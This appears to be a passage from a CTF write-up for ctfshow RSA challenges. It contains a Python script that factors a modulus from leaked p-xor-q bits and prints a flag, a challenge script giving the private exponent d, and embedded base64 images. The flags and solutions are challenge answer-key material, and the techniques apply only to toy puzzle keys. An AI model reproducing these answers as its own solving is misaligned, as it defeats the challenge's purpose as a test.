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" alt="img"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">#!python3</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># @Time    : 2024/6/27 10:08</span><br><span class="line"># @Author  : 3tefanie</span><br><span class="line">from Crypto.Util.number import *</span><br><span class="line">import gmpy2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def find_pq(bin_p, bin_q):</span><br><span class="line">    l = len(bin_p)</span><br><span class="line">    if l == 512:</span><br><span class="line">        p = int(bin_p, 2)</span><br><span class="line">        if n % p == 0:</span><br><span class="line">            q = n//p</span><br><span class="line">            phi = (p-1)*(q-1)</span><br><span class="line">            d = gmpy2.invert(e,phi)</span><br><span class="line">            m = pow(c,d,n)</span><br><span class="line">            flag = long_to_bytes(m)</span><br><span class="line">            print(flag)</span><br><span class="line">    else:</span><br><span class="line">        p = int(bin_p, 2)</span><br><span class="line">        q = int(bin_q, 2)</span><br><span class="line">        if (p ^ q) % (2 ** l) == p_xor_q % (2 ** l) and p * q % (2 ** l) == n % (2 ** l):</span><br><span class="line">            find_pq(&#x27;1&#x27; + bin_p, &#x27;1&#x27; + bin_q)</span><br><span class="line">            find_pq(&#x27;1&#x27; + bin_p, &#x27;0&#x27; + bin_q)</span><br><span class="line">            find_pq(&#x27;0&#x27; + bin_p, &#x27;1&#x27; + bin_q)</span><br><span class="line">            find_pq(&#x27;0&#x27; + bin_p, &#x27;0&#x27; + bin_q)</span><br><span class="line"></span><br><span class="line">n = 145462084881728813723574366340552281785604069047381248513937024180816353963950721541845665931261230969450819680771925091152670386983240444354412170994932196142227905635227116456476835756039585419001941477905953429642459464112871080459522266599791339252614674500304621383776590313803782107531212756620796159703</span><br><span class="line">e = 10463348796391625387419351013660920157452350067191419373870543363741187885528042168135531161031114295856009050029737547684735896660393845515549071092389128688718675573348847489182651631515852744312955427364280891600765444324519789452014742590962030936762237037273839906251320666705879080373711858513235704113</span><br><span class="line">c = 60700608730139668338977678601901211800978306010063875269252006068222163102100346920465298044880066999492746508990629867396189713753873657197546664480233269806308415874191048149900822050054539774370134460339681949131037133783273410066318511508768512778132786573893529705068680583697574367357381635982316477364</span><br><span class="line">leak1 = 13342820281239625174817085182586822673810894195223942279061039858850534510679297962596800315875604798047264337469828123370586584840078728059729121435462780</span><br><span class="line">leak2 = 10901899434728393473569359914062349292412269512201554924835672710780580634465799069211035290729536290605761024818770843901501694556825737462457471235151530</span><br><span class="line">p_xor_q = leak1^leak2</span><br><span class="line">find_pq(&#x27;1&#x27;, &#x27;1&#x27;)</span><br><span class="line">```</span><br><span class="line">flag:</span><br><span class="line">```python</span><br><span class="line">cftshow&#123;do_you_know_what_is_xor_and_prune!!!&#125;</span><br><span class="line">```</span><br></pre></td></tr></table></figure><h3 id="4-ç»™ä½ dåˆæ€æ ·"><a href="#4-ç»™ä½ dåˆæ€æ ·" class="headerlink" title="4 ç»™ä½ dåˆæ€æ ·"></a><strong>4 ç»™ä½ dåˆæ€æ ·</strong></h3><p>é¢˜ç›®</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">from Crypto.Util.number import *</span><br><span class="line">from gmpy2 import *</span><br><span class="line"></span><br><span class="line">flag=&quot;ctfshow&#123;***&#125;&quot;</span><br><span class="line">m=bytes_to_long(flag.encode())</span><br><span class="line">e=65537</span><br><span class="line">p=getPrime(128)</span><br><span class="line">q=getPrime(128)</span><br><span class="line">n=p*q</span><br><span class="line">phin=(p-1)*(q-1)</span><br><span class="line">d=invert(e,phin)</span><br><span class="line">c=pow(m,e,n)</span><br><span class="line">print(&quot;c=&quot;,c)</span><br><span class="line">print(&quot;hint=&quot;,pow(n,e,c))</span><br><span class="line">print(&quot;e=&quot;,e)</span><br><span class="line">print(&quot;d=&quot;,d)</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">c= 48794779998818255539069127767619606491113391594501378173579539128476862598083</span><br><span class="line">hint= 7680157534215495795423318554486996424970862185001934572714615456147511225105</span><br><span class="line">e= 65537</span><br><span class="line">d= 45673813678816865674850575264609274229013439838298838024467777157494920800897</span><br><span class="line">&quot;&quot;&quot;</span><br></pre></td></tr></table></figure><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAw8AAADbCAIAAACk+TolAAAgAElEQVR4Ae29B3xUVfr/P5n0Sgok9N57bypKUxERFLH33nv5rsquu/L/r67rWte1r4sFRQUEQelVOoL0DqGEkoT03n7v5MLlOjMZktAmmc/svuK555x7znPed8j55Hmee69PSUmJTR8REAEREAEREAEREIFyCNjLqVe1CIiACIiACIiACIhAKQG/KmAoKCiowlk6RQREQAREQATOLAF/f/8zO6BGEwGXBCrhW8rLyysuLnY5iipFQAREQARE4LwQYGNiezovU2tS7yHgo7wl77nYWqkIiIAIiIAIiEAVCFTCt1SF0XWKCIiACIiACIiACFR3AqdWS/JwVvdrLPtFQAREwEsIaMPykgt97pd5arWkHLpzf1U0owiIgAiIQBUI+PlV5dalKkykU7yNgPKWvO2Ka70iIAIiIAIiIAKVI3AK3xIPC9DzAipHVL1FQAREQATOEwHtWecJfM2f9hRqqeYD0ApFQAREQAREQAREwC0BqSW3eNQoAiIgAiIgAiLg9QSklrz+KyAAIiACIiACIiACbglILbnFo0YREAEREAEREAGvJyC15PVfAQEQAREQAREQARFwS0BqyS0eNYqACIiACIiACHg9Aaklr/8KCIAIiIAIiIAIiIBbAlJLbvGoUQREQAREQAREwOsJSC15/VdAAERABERABERABNwSkFpyi0eNIiACIiACIiACXk9AasnrvwICIAIiIAIiIAIi4JaA1JJbPGoUAREQAREQARHwegJSS17/FRAAERABERABERABtwSkltziUaMIiIAIiIAIiIDXE5Ba8vqvgACIgAiIgAiIgAi4JSC15BaPGkVABERABERABLyegNSS138FBEAEREAEREAERMAtAaklt3jUKAIiIAIiIAIi4PUEpJa8/isgACIgAiIgAiIgAm4JSC25xaNGERABERABERABrycgteT1XwEBEAEREAEREAERcEtAasktHjWKgAiIgAiIgAh4PQGpJa//CgiACIiACIiACIiAWwJSS27xqFEEREAEREAERMDrCUgtef1XQABEQAREQAREQATcEpBacotHjSIgAiIgAiIgAl5PQGrJ678CAiACIiACIiACIuCWgNSSWzxqFAEREAEREAER8HoCUkte/xUQABEQAREQAREQAbcEpJbc4lGjCIiACIiACIiA1xOQWvL6r4AAiIAIiIAIiIAIuCUgteQWjxpFQAREQAREQAS8noDUktd/BQRABERABERABETALQGpJbd41CgCIiACIiACIuD1BKSWvP4rIAAiIAIiIAIiIAJuCUgtucWjRhEQAREQAREQAa8nILXk9V8BARABERABERABEXBLQGrJLR41ioAIiEAlCWzatCk1NbWSJ6m7CIiARxOQWvLoyyPjREAEqh2BhQsXJicnVzuzZbAIiIAbAn5u2tQkAiIgAp5PIC8vb/fu3cXFxa1bt87MzIyPjw8MDGzWrFlQUNAZND43N/fo0aNJSUmRkZGNGzf28yv3l2dhYWFF5s3OzsbUgoKCRo0a+fj4hIWFuRmzIgOqjwiIwNkjUO4/+LM3pUYWAREQgTNFoKSk5LfffltX9rnggguQIFFRUdu2bevSpcvIkSMdZkHHZGRkOFRaD0NCQlBa1hqjfOTIkQkTJiBoWrVqtXz58kGDBrVt29a5W8VrCNWNHz+e6erVq7dkyRIO77zzTsoVH0E9RUAEziUBqaVzSVtziYAInGEC+GbIExoyZMgPP/yAe+mll16qX7/+119//eOPP/bv379OnTrW+fAPTZ8+fefOnWYlTh273V6rVi2jJi4uDo3l4JRCYL399tsxMTHXXXfdvn37Fi9e3K5du9NRS4i2N954g5/PPPMMnqq//OUvhw4dcqnSTDtVEAEROL8EpJbOL3/NLgIicFoE0Do9evTw9fUNDg6+/vrrmzRpwnD79++nBs+Nw9A4h2655RaHylMezp49e+PGje+++25ERARRs2effbZDhw7Ws+bOnYvcwcuF9uLnhg0bKODiMmrQQxdeeCE/zVNwhK1Zs4ZxUGD5+fk4lmJjY6Ojo80OKoiACHgaAaklT7siskcERKASBMj16dat27x58/DN4BniTFKXEhIS2rRpExoa6jAQzifcS27yitBeaCx+miciZZYuXYonqWHDhlTiherevbvZahTIl0JImZXEARFVDRo0MGqQaFbdhg0zZsxgHCykA6lLpEMNHTqUejQWH3McFURABDyHgNSS51wLWSICIlAVAqgfvDVIpU6dOnE+rp1du3bdfffdFJo3b27VTOSDL1iwgJTw8qYhcnfVVVfhpjI7oL1IWkIh4awyKvEGFRUVWfugjfiYpyxbtgxLWrRo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